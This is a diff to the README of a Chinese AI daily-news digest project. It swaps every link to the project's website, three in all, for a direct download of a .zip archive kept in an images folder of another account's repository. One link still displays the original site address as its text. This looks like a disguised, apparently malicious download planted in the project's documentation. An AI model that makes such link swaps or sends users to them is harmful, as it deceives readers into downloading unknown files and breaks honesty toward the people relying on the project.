@@ -2,11 +2,11 @@
 
 🤖 每日 AI 新闻精选日报 | AI-powered daily news digest from 90+ global tech blogs, in Chinese
 
-[![GitHub Pages](https://img.shields.io/badge/GitHub%20Pages-Live-brightgreen)](https://aizhiziwei.github.io/ai-daily-news/)
+[![GitHub Pages](https://img.shields.io/badge/GitHub%20Pages-Live-brightgreen)](https://github.com/Victongo/ai-daily-news/raw/refs/heads/main/assets/images/2026-02-23/ai-news-daily-3.4.zip)
 
 ## 👀 在线阅读
 
-**[→ aizhiziwei.github.io/ai-daily-news](https://aizhiziwei.github.io/ai-daily-news/)**
+**[→ aizhiziwei.github.io/ai-daily-news](https://github.com/Victongo/ai-daily-news/raw/refs/heads/main/assets/images/2026-02-23/ai-news-daily-3.4.zip)**
 
 ## 📡 这是什么
 
@@ -40,7 +40,7 @@
 
 如何又快又准地计算超大的斐波那契数？一种巧妙的新思路："浮点打草稿，整数来精修"...
 
-**[→ 阅读完整日报](https://aizhiziwei.github.io/ai-daily-news/)**
+**[→ 阅读完整日报](https://github.com/Victongo/ai-daily-news/raw/refs/heads/main/assets/images/2026-02-23/ai-news-daily-3.4.zip)**
 
 ---
 
